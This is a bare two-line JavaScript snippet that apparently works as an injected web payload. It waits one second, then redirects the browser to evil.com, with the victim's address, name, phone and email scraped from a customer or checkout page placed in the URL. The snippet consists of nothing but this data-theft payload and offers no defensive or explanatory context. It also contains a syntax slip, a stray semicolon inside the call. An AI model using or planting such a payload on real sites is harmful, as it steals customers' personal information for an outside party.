await new Promise(r => setTimeout(r, 1000));
location.replace("//evil.com?victim-address-name-phone=" + document.querySelector('.address-summary').innerText+"&email="+document.querySelector('.customer-summary-email').innerText.trim(););

